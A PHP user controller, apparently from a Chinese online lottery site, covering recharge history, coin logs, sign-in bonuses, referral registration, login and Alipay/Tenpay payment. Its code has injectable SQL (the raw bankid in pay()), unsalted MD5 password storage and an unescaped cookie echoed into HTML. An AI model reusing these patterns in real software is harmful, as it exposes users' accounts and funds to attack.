		$html .= '<tr>';
		$html .= '<td class="k">充值状态</td>';
		$html .= '<td class="v">'.($data['state'] ? '充值成功' : '<span class="green">正在处理</span>').'</td>';
		$html .= '<td class="k">成功时间</td>';
		$html .= '<td class="v">'.($data['state'] ? date('m-d H:i:s', $data['actionTime']) : '--').'</td>';
		$html .= '</tr>';
		$html .= '<tr>';
		$html .= '<td class="k">充值备注</td>';
		$html .= '<td class="v" colspan="3">'.($data['info'] ? $data['info'] : '--').'</td>';
		$html .= '</tr>';
		$html .= '</table>';
		$html .= '</div>';
		$this->dialogue(array(
			'class' => 'mid',
			'body' => $html,
			'yes'  => array('text' => '确定'),
		));
	}
	
	private function page_args() {
		$page_args = array();
		if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
		if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
		$page_args['page'] = '{page}';
		return $page_args;
	}
	
	private function recharge_search_func($page_current) {
		$uid = $this->user['uid'];
		$pagesize = $this->pagesize;
		$skip = ($page_current - 1) * $pagesize;
		$sql = "SELECT ~field~ FROM `{$this->db_prefix}member_recharge` a LEFT JOIN `{$this->db_prefix}bank_list` b ON b.id=a.bankId WHERE a.isDelete=0 AND a.uid={$uid}".$this->build_where_time('a.actionTime')." ~order~ ~limit~";
		$sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
		$sql_total = str_replace('~limit~', '', $sql_total);
		$sql_total = str_replace('~order~', '', $sql_total);
		$total = $this->db->query($sql_total, 2);
		$total = $total['__total'];
		$sql_data = str_replace('~field~', 'a.rechargeId,a.amount,a.rechargeAmount,a.info,a.state,a.actionTime,b.name as bankName', $sql);
		$sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
		$sql_data = str_replace('~order~', 'ORDER BY a.id DESC', $sql_data);
		$data = $this->db->query($sql_data, 3);
		return array(
			'data' => $data,
			'total' => $total,
		);
	}
	
	public function fresh() {
		$this->check_post();
		$this->user_check_func(); // 用户登录检查
		$this->fresh_user_session(); // 刷新用户session
		// 更新用户级别
		$uid = $this->user['uid'];
		$score = $this->user['scoreTotal'];
		$new_grade = $this->db->query("SELECT MAX(`level`) AS `value` from `{$this->db_prefix}member_level` WHERE `minScore` <= {$score} LIMIT 1", 2);
		$new_grade = $new_grade['value'];
		if($new_grade > $this->user['grade']) {
			$sql = "UPDATE `{$this->db_prefix}members` SET `grade`={$new_grade} WHERE `uid`=$uid LIMIT 1";
			$this->db->query($sql, 0);
			$this->user['grade'] = $new_grade;
		}
		$this->display('/user/fresh', array(
			'user' => $this->user,
		));
	}
	
	public function sign() {
		$this->check_post();
		$this->user_check_func();
		$type = 50;
		$uid = $this->user['uid'];
		$today = strtotime('today');
		$coin = floatval($this->config['huoDongSign_coin']);
		$bonus = floatval($this->config['huoDongSign_bonus']);
		if ($this->user['coin'] < $coin) core::error('账户余额至少为<span class="btn btn-red">'.$coin.'</span>元才能才加此活动');
		if (!$bonus) core::error('每日签到活动已结束');
		$sql = "SELECT `id` FROM `{$this->db_prefix}member_bank` WHERE `uid`={$uid} AND `enable`=1 LIMIT 1";
		if (!$this->db->query($sql, 2)) {
			$this->dialogue(array(
				'type' => 'error',
				'text' => '设置银行账户后才能参与此活动',
				'auto' => true,
				'yes'  => array(
					'text' => '前往设置',
					'func' => 'setTimeout(function() {$("#user-setting").trigger("click");}, 300);',
				),
				'no' => array('text' => '暂不参与'),
			));
		}
		$sql = "SELECT `id` FROM `{$this->db_prefix}coin_log` WHERE `actionTime`>={$today} AND `liqType`={$type} AND `uid`={$uid} LIMIT 1";
		if ($this->db->query($sql, 2)) core::error('今天您已经签到过了');
		$this->set_coin(array(
			'info' => '签到活动',
			'liqType' => $type,
			'coin' => $bonus,
		));
		$this->dialogue(array(
			'type' => 'success',
			'text' => '签到成功，系统赠送您<span class="btn btn-red">'.$bonus.'</span>元，请注意查收',
			'auto' => true,
			'yes'  => array(
				'text' => '我知道了',
				'func' => 'lottery.user_fresh();',
			),
		));
	}
	
	public function coin() {
		$this->user_check_func();
		if ($this->post) {
			$tpl = $this->ispage ? '/user/coin_body' : '/user/coin';
			$this->get_time();
			$type = $this->coin_get_type();
			$page_current = $this->get_page();
			$coin_log = $this->coin_search_func($type, $page_current);
			$page_max = $this->get_page_max($coin_log['total']);
			if ($page_current > $page_max) core::__403();
			$page_args = $this->coin_page_args($type);
			$this->display($tpl, array(
				'type' => $type,
				'data' => $coin_log['data'],
				'page_current' => $page_current,
				'page_max' => $page_max,
				'page_url' => '/user/coin?'.http_build_query($page_args),
				'page_container' => '#coin-log .body',
			));
		} else {
			$this->ajax();
		}
	}
	
	public function coin_search() {
		$this->user_check_func();
		$this->check_post();
		$this->get_time(false);
		$type = $this->coin_get_type(false);
		$coin_log = $this->coin_search_func($type, 1);
		$page_max = $this->get_page_max($coin_log['total']);
		$page_args = $this->coin_page_args($type);
		$this->display('/user/coin_body', array(
			'type' => $type,
			'data' => $coin_log['data'],
			'page_current' => 1,
			'page_max' => $page_max,
			'page_url' => '/user/coin?'.http_build_query($page_args),
			'page_container' => '#coin-log .body',
		));
	}
	
	private function coin_search_func($type, $page_current) {
		$uid = $this->user['uid'];
		$pagesize = $this->pagesize;
		$skip = ($page_current - 1) * $pagesize;
		$where_type = $type ? " AND l.liqType={$type} " : '';
		$where_time = $this->build_where_time('l.actionTime');
		$sql = "SELECT ~field~ FROM `{$this->db_prefix}coin_log` l LEFT JOIN `{$this->db_prefix}bets` b ON b.id=l.extfield0 AND b.uid=l.uid WHERE l.uid={$uid} $where_type $where_time ~order~ ~limit~";
		$sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
		$sql_total = str_replace('~limit~', '', $sql_total);
		$sql_total = str_replace('~order~', '', $sql_total);
		$total = $this->db->query($sql_total, 2);
		$total = $total['__total'];
		$field = 'b.wjorderId,l.liqType,l.coin,l.fcoin,l.userCoin,l.actionTime,l.extfield0,l.extfield1,l.info';
		$sql_data = str_replace('~field~', $field, $sql);
		$sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
		$sql_data = str_replace('~order~', 'ORDER BY l.id DESC', $sql_data);
		$data = $this->db->query($sql_data, 3);
		return array(
			'data' => $data,
			'total' => $total,
		);
	}
	
	private function coin_get_type($get = true) {
		$data = $get ? $_GET : $_POST;
		return (array_key_exists('type', $data) && array_key_exists($data['type'], $this->coin_types)) ? intval($data['type']) : 0;
	}
	
	private function coin_page_args($type) {
		$page_args = array();
		if ($type) $page_args['type'] = $type;
		if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
		if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
		$page_args['page'] = '{page}';
		return $page_args;
	}
	
	public function logout() {
		unset($_SESSION[$this->user_session]);
		if ($this->user && array_key_exists('uid', $this->user)) {
			$uid = $this->user['uid'];
			$this->update("UPDATE `{$this->db_prefix}member_session` SET `isOnLine`=0 WHERE `uid`={$uid}");
		}
		$url_login = '/user/login?client_type='.$this->client_type;
		if ($this->post) {
			$this->dialogue(array(
				'type' => 'success',
				'text' => '您已安全退出，欢迎再次光临'.$this->config['webName'],
				'auto' => true,
				'yes'  => array(
					'text' => '重新登录',
					'func' => '$.reload("'.$url_login.'");',
				),
			));
		} else {
			header('Location: '.$url_login);
		}
	}
	
	public function reg() {
		if(array_key_exists($this->user_session, $_SESSION) && $_SESSION[$this->user_session]) unset($_SESSION[$this->user_session]);
		if (array_key_exists('client_type', $_GET) && in_array($_GET['client_type'], $this->clients)) $this->client_type = $_GET['client_type'];
		if ($this->post) {
			if (!array_key_exists('lid', $_POST) || ($_POST['lid'] !== '0' && !core::lib('validate')->number($_POST['lid']))) core::__403();
			$lid = intval($_POST['lid']);
			$username = array_key_exists('username', $_POST) ? trim($_POST['username']) : '';
			$password = array_key_exists('password', $_POST) ? trim($_POST['password']) : '';
			$password_repeat = array_key_exists('password_repeat', $_POST) ? trim($_POST['password_repeat']) : '';
			$qq = array_key_exists('qq', $_POST) ? trim($_POST['qq']) : '';
			if (empty($username)) core::error('账户名不能为空');
			if (!core::lib('validate')->username($username)) core::error('账户名格式错误');
			if ($this->db->query("SELECT `uid` FROM `{$this->db_prefix}members` WHERE `username`='{$username}' LIMIT 1", 2)) core::error('账户名已存在');
			if (empty($password)) core::error('登录密码不能为空');
			if ($password !== $password_repeat) core::error('两次输入的密码不一致');
			if (empty($qq)) core::error('QQ不能为空');
			if (!core::lib('validate')->qq($qq)) core::error('您输入的QQ有误');
			$ip = $this->ip(true);
			$min_reg_time = $this->time - 86400;
			$sql = "SELECT `username` FROM `{$this->db_prefix}members` WHERE `regIP`={$ip} AND `regTime`>{$min_reg_time} ORDER BY `uid` DESC LIMIT 1";
			$reged = $this->db->query($sql, 2);
			if ($reged) core::error('您的IP已经注册过用户：'.$reged['username']);
			$defaultFandian = floatval($this->config['defaultFandian']);
			if (!$lid && !$defaultFandian) core::error('系统已关闭直接注册，请通过邀请链接注册');
			$link = $lid ? $this->db->query("SELECT * FROM `{$this->db_prefix}links` WHERE `lid`={$lid} AND `enable`=1 LIMIT 1", 2) : array();
			if ($lid && !$link) {
				core::error('该链接已失效，请联系您的上级重新索取注册链接');
			} else {
				$parents = $this->db->query("SELECT `parents` FROM `{$this->db_prefix}members` WHERE `uid`={$link['uid']} LIMIT 1", 2);
				$parents = $parents['parents'];
			}
			$para = array(
				'source' => 1,
				'username' => $username,
				'type' => $link ? $link['type'] : 0,
				'password' => md5($password),
				'parentId' => $link ? $link['uid'] : null,
				'parents' => $link ? $parents : '',
				'fanDian' => $link ? $link['fanDian'] : $defaultFandian,
				'regIP' => $ip,
				'regTime' => $this->time,
				'qq' => $qq,
				'coin' => 0,
				'fcoin' => 0,
				'score' => 0,
				'scoreTotal' => 0,			
			);
			try {
				$this->db->transaction('begin');
				$id = $this->db->insert($this->db_prefix.'members', $para);
			    if ($id) {
					$sql = "UPDATE `{$this->db_prefix}members` SET `parents`=CONCAT(parents, ',', $id) WHERE `uid`=$id LIMIT 1";
					$this->db->query($sql, 0);
					if ($lid) $this->db->query("UPDATE `{$this->db_prefix}links` SET `usedTimes`=`usedTimes`+1,`updateTime`={$this->time} WHERE `lid`=$lid LIMIT 1", 0);
					$zczs = intval($this->config['zczs']);
					if ($zczs > 0) {
						$this->set_coin(array(
							'uid' => $id,
							'liqType' => 55,
							'info' => '注册奖励',
							'coin' => $zczs,
						));
					}
					$this->db->transaction('commit');
					echo $zczs !== 0 ? '注册成功，系统赠送您 '.$zczs.' 元' : '注册成功';
				} else {
					throw new Exception('添加用户信息到数据库失败');
				}	
			} catch(Exception $e) {
				$this->db->transaction('rollBack');
				core::error($e->getMessage());
			}
		} else {
			$args = array('lid' => 0);
			$id = (array_key_exists('id', $_GET) && core::lib('validate')->reg_code($_GET['id'])) ? $_GET['id'] : '';
			if ($id) {
				$lid = $this->myxor($this->hex2str($id));
				if (is_numeric($lid)) {
					$link = $this->db->query("SELECT * FROM `{$this->db_prefix}links` WHERE lid={$lid} LIMIT 1", 2);
					if ($link && $link['enable']) $args['lid'] = $lid;
				}
			} else {
				if (!floatval($this->config['defaultFandian'])) core::error('系统已关闭直接注册，请通过邀请链接注册');
			}
			$this->display('/user/reg', $args);
		}
	}

	public function login() {
		if (array_key_exists('client_type', $_GET) && in_array($_GET['client_type'], $this->clients)) $this->client_type = $_GET['client_type'];
		if ($this->post) {
			$username = array_key_exists('username', $_POST) ? trim($_POST['username']) : '';
			$password = array_key_exists('password', $_POST) ? trim($_POST['password']) : '';
			$remember = (array_key_exists('remember', $_POST) && $_POST['remember'] === '1') ? 1 : 0;
			if (empty($username)) core::error('账户名不能为空');
			if (empty($password)) core::error('登录密码不能为空');
			if (!core::lib('validate')->username($username)) core::error('账户名格式错误');
			$sql = "SELECT * FROM `{$this->db_prefix}members` WHERE `isDelete`=0 AND `username`='$username' LIMIT 1";
			$user = $this->db->query($sql, 2);
			if (!$user) core::error('您输入的账户不存在');
			if (md5($password) !== $user['password']) core::error('您输入的密码错误');
			if (!$user['enable']) core::error('您输入的账户已被冻结，请联系管理员');
			if ($remember === 1) {
				setcookie('username', $username, $this->time + 86400);
				setcookie('remember', $remember, $this->time + 86400);
			} else {
				setcookie('username', $username, $this->time - 3600);
				setcookie('remember', $remember, $this->time - 3600);
			}
			$session = array(
				'uid' => $user['uid'],
				'username' => $user['username'],
				'session_key' => session_id(),
				'loginTime' => $this->time,
				'accessTime' => $this->time,
				'loginIP' => $this->ip(true)
			);
			$session = array_merge($session, $this->get_browser());
			$session_id = $this->db->insert($this->db_prefix.'member_session', $session);
			if ($session_id) $user['sessionId'] = $session_id;
			$_SESSION[$this->user_session] = serialize($user);
			$uid = $user['uid'];
			$this->db->query("UPDATE `{$this->db_prefix}member_session` SET `isOnLine`=0,`state`=1 WHERE `uid`={$uid} AND `id`<{$session_id}", 0);
		} else {
			$username = array_key_exists('username', $_COOKIE) ? ' value="'.$_COOKIE['username'].'"' : '';
			$remember = (array_key_exists('remember', $_COOKIE) && $_COOKIE['remember'] == 1) ? ' checked' : '';
			$this->display('/user/login', array(
				'username' => $username,
				'remember' => $remember,
			));
		}
	}
	
	// 获取支付实例
	private function get_pay_instance() {
		static $instance;
		if (!$instance) {
			require(ROOT.'/pay.config.php');
			$pay_file = require(SYSTEM.'/pay/'.PAY_TYPE.'.pay.php');
			$pay_class = 'pay_'.PAY_TYPE;
			$instance = new $pay_class;
		}
		return $instance;
	}
	
	// 获取订单编号
	private function get_orderid(){
		$rechargeId = mt_rand(100000, 999999);
		if($this->db->query("SELECT `id` FROM `{$this->db_prefix}member_recharge` WHERE `rechargeId`={$rechargeId} LIMIT 1", 2)){
			return $this->get_orderid();
		}else{
			return $rechargeId;
		}
	}
	
	// 支付方法
	public function pay() {
		
		$this->user_check_func();
		$this->check_post();

		$bankid = trim($_POST['bankid']); //获取银行
		$amount = trim($_POST['amount']); //获取金额
		$amount = number_format($amount, 2, '.', '');
		
		if($amount <= 0) core::error('充值金额错误，请重新操作');
		$bank = $this->db->query("SELECT `id` FROM `{$this->db_prefix}bank_list` WHERE `id`={$bankid} LIMIT 1", 2);
		if (!$bank) core::error('充值银行不存在，请重新选择');
		if ($amount < $this->config['rechargeMin']) core::error('充值金额最低为<span class="btn btn-red">'.$this->config['rechargeMin'].'</span>元');
		if ($amount > $this->config['rechargeMax']) core::error('充值金额最高为<span class="btn btn-red">'.$this->config['rechargeMax'].'</span>元');
		
		$orderid = $this->get_orderid(); //您的订单Id号
		//数据库中增加会员充值记录
		$id = $this->db->insert($this->db_prefix.'member_recharge', array(
			'uid' => $this->user['uid'],
			'rechargeId' => $orderid ,
			'username' => $this->user['username'],
			'amount' => $amount,
			'mBankId' => $bankid,
			'actionIP' => $this->ip(true),
			'actionTime' => $this->time,
			'info' => '用户充值',
		));
		if (!$id) core::error('更新充值提交记录到数据库失败，请重试');
		if ($bankid === '1' || $bankid === '2') {
			$this->pay_online($bankid, $amount, $orderid);
		} else {
			// 生成回调地址及返回地址
			$url_callback = 'http://'.$_SERVER['SERVER_NAME'].'/user/pay_callback';
			$url_return = 'http://'.$_SERVER['SERVER_NAME'].'/user/recharge';
			// 获取支付实例
			$instance = $this->get_pay_instance();
			$instance->user = $this->user;
			$instance->pay($bankid, $amount, $orderid, $url_callback, $url_return);
		}
	}
	
	// 在线支付支付方法
	private function pay_online($bankid, $amount, $orderid) {
		$bank = $this->db->query("SELECT * FROM `{$this->db_prefix}admin_bank` WHERE `bankid`={$bankid} LIMIT 1", 2);
		if (!$bank) core::error('系统错误');
		if (!$bank['enable']) core::error('该充值方式已停用');
		if ($bankid === '1') { // 支付宝
			$html  = '<form name="alipaypay" method="post" action="https://shenghuo.alipay.com/send/payment/fill.htm">';
			$html .= '<input type="hidden" name="optEmail" value="'.$bank['account'].'">';
			$html .= '<input type="hidden" name="payAmount" value="'.$amount.'">';
			$html .= '<input type="hidden" name="title" value="'.$this->user['username'].'">';
			$html .= '<input type="hidden" name="memo" value="'.$orderid.'">';
			$html .= '<input type="hidden" name="isSend" value="">';
			$html .= '<input type="hidden" name="smsNo" value="">';
			$html .= '</form>';
			$html .= '<script type="text/javascript">document.alipaypay.submit();</script>';
			echo $html;
		} else { // 财付通
			$html  = '<div class="detail"><table cellpadding="0" cellspacing="0" width="100%">';
			$html .= '<tr>';
			$html .= '<td>充值单号</td>';
			$html .= '<td>'.$orderid.'</td>';
			$html .= '</tr>';
			$html .= '<tr>';
			$html .= '<td>充值金额</td>';
			$html .= '<td>'.$amount.' 元</td>';
			$html .= '</tr>';
			$html .= '<tr>';
			$html .= '<tr>';
			$html .= '<td>收款账号</td>';
			$html .= '<td>'.$bank['account'].'</td>';
			$html .= '</tr>';
			$html .= '<tr>';
			$html .= '<td>收款人姓名</td>';
			$html .= '<td>'.$bank['username'].'</td>';
			$html .= '</tr>';
			$html .= '<tr>';
			$html .= '<td colspan="2"><a class="icon-link-ext" style="color:#35928f" href="https://www.tenpay.com/v2/account/pay/index.shtml" target="_blank">前往充值</a></td>';
			$html .= '</tr>';
			$html .= '</table></div>';
			$this->dialogue(array(
				'class' => 'mid',
				'body' => $html,
				'yes'  => array('text' => '确定'),
			));
		}
	}
	
	public function pay_callback() {
		ini_set('display_errors', 'On');
		error_reporting(E_ALL | E_STRICT);
		$instance = $this->get_pay_instance();
		$instance->callback();
	}
	
	private function get_browser(){
		$flag = $_SERVER['HTTP_USER_AGENT'];
		$para = array();
		if (preg_match('/Windows[\d\. \w]*/', $flag, $match)) $para['os'] = $match[0]; // 检查操作系统
		if (preg_match('/Chrome\/[\d\.\w]*/', $flag, $match)) { // 检查Chrome
			$para['browser'] = $match[0];
		} else if (preg_match('/Safari\/[\d\.\w]*/', $flag, $match)) { // 检查Safari
			$para['browser'] = $match[0];
		} else if (preg_match('/MSIE [\d\.\w]*/', $flag, $match)) { // IE
			$para['browser'] = $match[0];
		} else if (preg_match('/Opera\/[\d\.\w]*/', $flag, $match)) { // opera
			$para['browser'] = $match[0];
		} else if (preg_match('/Firefox\/[\d\.\w]*/', $flag, $match)) { // Firefox
			$para['browser'] = $match[0];
		} else if (preg_match('/OmniWeb\/(v*)([^\s|;]+)/i', $flag, $match)) { // OmniWeb
			$para['browser'] = $match[2];
		} else if (preg_match('/Netscape([\d]*)\/([^\s]+)/i', $flag, $match)) { // Netscape
			$para['browser'] = $match[2];
		} else if (preg_match('/Lynx\/([^\s]+)/i', $flag, $match)) { // Lynx
			$para['browser'] = $match[1];
		} else if (preg_match('/360SE/i', $flag, $match)) { // 360SE
			$para['browser'] = '360安全浏览器';
		} else if (preg_match('/SE 2.x/i', $flag, $match)) { // 搜狗
			$para['browser'] = '搜狗浏览器';
		} else {
			$para['browser']='unkown';
		}
		return $para;
	}

}